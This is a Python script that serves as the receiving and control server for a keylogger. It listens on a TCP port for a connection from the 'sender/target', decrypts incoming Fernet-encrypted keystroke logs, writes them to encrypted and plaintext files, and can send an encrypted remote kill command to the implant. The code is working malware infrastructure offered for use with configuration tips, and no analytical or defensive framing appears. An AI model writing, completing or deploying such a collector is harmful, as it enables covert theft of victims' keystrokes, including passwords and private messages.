import socket
from cryptography.fernet import Fernet
import threading

KEY = b'TuAjBP-3G4Br9vpwzpFTn-W1uS4l32YT-YyWSOGtJXg='  # Replace with your actual Fernet key
fernet = Fernet(KEY)

HOST = '192.168.1.xxx' # Replace with your server's IP address
PORT = 9999 # Replace with the same port number as the sender/target

encrypted_log_file = "received_encrypted_keylog.txt"
decrypted_log_file = "received_decrypted_keylog.txt"

def send_kill_command(conn):
    # Wait for user input in a separate thread
    while True:
        cmd = input("Type 'kill' to stop the sender remotely: ").strip().lower()
        if cmd == 'kill':
            try:
                kill_msg = fernet.encrypt(b'KILL')
                conn.sendall(kill_msg)
                print("[!] Sent remote kill command to sender.")
            except Exception as e:
                print(f"[!] Failed to send kill command: {e}")
            break

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
    server_socket.bind((HOST, PORT))
    server_socket.listen(1) # Listen for incoming connections and accept only one connection. Minimum for a keylogger receiver is one connection, and maximum can be adjusted as needed. Run "sysctl kern.ipc.somaxconn" on server(mac) terminal to check the maximum number of connections allowed.
    print(f"[*] Listening on {HOST}:{PORT}")

    conn, addr = server_socket.accept()
    with conn:
        print(f"[+] Connected by {addr}")
        # Start a thread to listen for kill command input
        threading.Thread(target=send_kill_command, args=(conn,), daemon=True).start()
        while True:
            data = conn.recv(1024)
            if not data:
                print("[*] Connection closed by sender.")
                break

            # === Option B & C: Save encrypted data (comment this out for Option A) ===
            # Option B: Only save the encrypted data to a file, do not attempt to decrypt or print it.
            #   - Use this if you want to store logs for later decryption, or if you don't have the key yet.
            #   - The file 'received_encrypted_keylog.txt' will contain the raw encrypted logs.
            # Option C: Use this together with Option A to both save encrypted data and decrypt live.
            with open(encrypted_log_file, "ab") as ef:
                ef.write(data + b"\n")  # newline separator optional

            # === Option A & C: Decrypt live and save plaintext (comment out for Option B only) ===
            # Option A: Only decrypt the received data and print/save the plaintext, do not save the encrypted data.
            #   - Use this if you only care about the readable logs and don't need to keep the encrypted version.
            #   - The file 'received_decrypted_keylog.txt' will contain the decrypted logs.
            # Option C: Use this together with Option B to both save encrypted data and decrypt live.
            try:
                decrypted = fernet.decrypt(data).decode()
                print(decrypted, end="")
                with open(decrypted_log_file, "a") as df:
                    df.write(decrypted)
            except Exception as e:
                print(f"[!] Decryption error: {e}")

# Summary, since the above options can be confusing😅:
# Option A: Only the decryption/printing/saving block is active (comment out the encrypted save block).
# Option B: Only the encrypted save block is active (comment out the decryption block).
# Option C: Both blocks are active (default in this code) -- you get both encrypted and decrypted logs.